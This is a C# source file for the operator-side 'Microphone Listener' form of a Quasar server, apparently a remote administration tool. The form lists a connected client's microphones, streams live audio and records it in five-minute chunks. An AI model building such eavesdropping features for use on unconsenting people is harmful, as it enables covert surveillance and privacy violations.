using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using System.Media;
using System.Diagnostics;

namespace Quasar.Server.Forms
{
    public partial class FrmMicrophoneListener : Form
    {
        /// <summary>
        /// The client which can be used for the microphone listener.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly MicrophoneHandler _microphoneHandler;

        /// <summary>
        /// Path to the base download directory of the client.
        /// </summary>
        private readonly string _baseDownloadPath;

        /// <summary>
        /// Holds the opened microphone listener form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmMicrophoneListener> OpenedForms = new Dictionary<Client, FrmMicrophoneListener>();

        /// <summary>
        /// Indicates whether recording is currently active.
        /// </summary>
        private bool _isRecording;

        /// <summary>
        /// Indicates whether live listening is currently active.
        /// </summary>
        private bool _isLiveListening;

        /// <summary>
        /// List of available microphones.
        /// </summary>
        private string[] _availableMicrophones;
        private string[] _microphoneIds;

        /// <summary>
        /// Creates a new microphone listener form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the microphone listener form.</param>
        /// <returns>
        /// Returns a new microphone listener form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmMicrophoneListener CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmMicrophoneListener f = new FrmMicrophoneListener(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmMicrophoneListener"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the microphone listener form.</param>
        public FrmMicrophoneListener(Client client)
        {
            _connectClient = client;
            _microphoneHandler = new MicrophoneHandler(client);

            // Use the same path as the MicrophoneHandler
            _baseDownloadPath = _microphoneHandler.BaseDownloadPath;

            RegisterMessageHandler();
            InitializeComponent();
        }

        /// <summary>
        /// Registers the microphone message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _microphoneHandler.MicrophonesReceived += OnMicrophonesReceived;
            _microphoneHandler.AudioDataReceived += OnAudioDataReceived;
            _microphoneHandler.AudioFileReceived += OnAudioFileReceived;
            _microphoneHandler.ProgressChanged += OnProgressChanged;
            MessageHandler.Register(_microphoneHandler);
        }

        /// <summary>
        /// Unregisters the microphone message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_microphoneHandler);
            _microphoneHandler.ProgressChanged -= OnProgressChanged;
            _microphoneHandler.AudioFileReceived -= OnAudioFileReceived;
            _microphoneHandler.AudioDataReceived -= OnAudioDataReceived;
            _microphoneHandler.MicrophonesReceived -= OnMicrophonesReceived;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        /// <summary>
        /// Called when microphones are received from the client.
        /// </summary>
        private void OnMicrophonesReceived(object sender, string[] microphones)
        {
            this.Invoke((MethodInvoker)delegate
            {
                _availableMicrophones = microphones;
                
                // Populate recording microphones
                cmbMicrophones.Items.Clear();
                cmbMicrophones.Items.AddRange(microphones);
                
                // Populate live listening microphones
                cmbLiveMicrophones.Items.Clear();
                cmbLiveMicrophones.Items.AddRange(microphones);
                
                if (microphones.Length > 0)
                {
                    cmbLiveMicrophones.SelectedIndex = 0;
                    btnStartListening.Enabled = true;
                    btnStartRecording.Enabled = true;
                }
            });
        }


        /// <summary>
        /// Called when real-time audio data is received.
        /// </summary>
        private void OnAudioDataReceived(object sender, MicrophoneAudioData audioData)
        {
            this.Invoke((MethodInvoker)delegate
            {
                // Handle real-time audio data (could implement audio visualization here)
                lblRealTimeStatus.Text = $"Real-time data received: {audioData.AudioData.Length} bytes";
            });
        }

        /// <summary>
        /// Called when an audio file is completely received.
        /// </summary>
        private void OnAudioFileReceived(object sender, string fileName)
        {
            this.Invoke((MethodInvoker)delegate
            {
                lblStatus.Text = $"Audio file received: {fileName}";
            });
        }

        /// <summary>
        /// Called when progress is updated.
        /// </summary>
        private void OnProgressChanged(object sender, string message)
        {
            this.Invoke((MethodInvoker)delegate
            {
                lblStatus.Text = message;
            });
        }

        private void FrmMicrophoneListener_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Microphone Listener", _connectClient);

            if (!Directory.Exists(_baseDownloadPath))
            {
                Directory.CreateDirectory(_baseDownloadPath);
            }

            // Initialize UI - use max quality by default
            
            // Get available microphones
            _microphoneHandler.GetMicrophones();
        }

        private void FrmMicrophoneListener_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_isRecording)
            {
                _microphoneHandler.StopRecording();
            }
            UnregisterMessageHandler();
            _microphoneHandler.Dispose();
        }

        private void btnRefreshMicrophones_Click(object sender, EventArgs e)
        {
            btnRefreshMicrophones.Enabled = false;
            _microphoneHandler.GetMicrophones();
        }

        private void btnToggleRecording_Click(object sender, EventArgs e)
        {
            if (!_isRecording && cmbLiveMicrophones.SelectedIndex >= 0)
            {
                // Start Recording
                string microphoneId = cmbLiveMicrophones.SelectedIndex.ToString();
                int quality = 48000; // Max quality
                int chunkDuration = 300; // Default 5 minutes

                if (_isLiveListening)
                {
                    // Already listening, just enable recording on the server side
                    _microphoneHandler.EnableRecording(true);
                }
                else
                {
                    // Start recording with real-time streaming (so server gets the data)
                    _microphoneHandler.StartRecording(microphoneId, true, quality, chunkDuration);
                }
                
                _isRecording = true;
                btnStartRecording.Text = "Stop Recording";
                lblStatus.Text = _isLiveListening ? "Recording enabled (with live audio)..." : "Recording started...";
            }
            else if (_isRecording)
            {
                // Stop Recording
                if (_isLiveListening)
                {
                    // Still listening, just disable recording on server side
                    _microphoneHandler.EnableRecording(false);
                }
                else
                {
                    // Not listening, stop everything
                    _microphoneHandler.StopRecording();
                }
                
                _isRecording = false;
                btnStartRecording.Text = "Start Recording";
                lblStatus.Text = _isLiveListening ? "Recording disabled (still listening)..." : "Recording stopped.";
            }
        }

        #region Live Listening Event Handlers


        private void btnToggleListening_Click(object sender, EventArgs e)
        {
            if (!_isLiveListening && cmbLiveMicrophones.SelectedIndex >= 0)
            {
                // Start Listening
                string microphoneId = cmbLiveMicrophones.SelectedIndex.ToString();
                int quality = 48000; // Max quality

                // Start live listening without recording
                _microphoneHandler.StartLiveListening(microphoneId, quality);
                
                // Start audio playback for live listening
                var audioFormat = new NAudio.Wave.WaveFormat(quality, 16, 1);
                _microphoneHandler.StartAudioPlayback(audioFormat);
                
                _isLiveListening = true;
                btnStartListening.Text = "Stop Listening";
                lblStatus.Text = "Live listening started...";
            }
            else if (_isLiveListening)
            {
                // Stop Listening
                if (_isRecording)
                {
                    // Still recording, just disable audio playback
                    _microphoneHandler.StopAudioPlayback();
                }
                else
                {
                    // Not recording, stop everything
                    _microphoneHandler.StopLiveListening();
                    _microphoneHandler.StopAudioPlayback();
                }
                
                _isLiveListening = false;
                btnStartListening.Text = "Start Listening";
                lblStatus.Text = _isRecording ? "Live listening disabled (still recording)..." : "Live listening stopped.";
            }
        }


        #endregion
    }
}
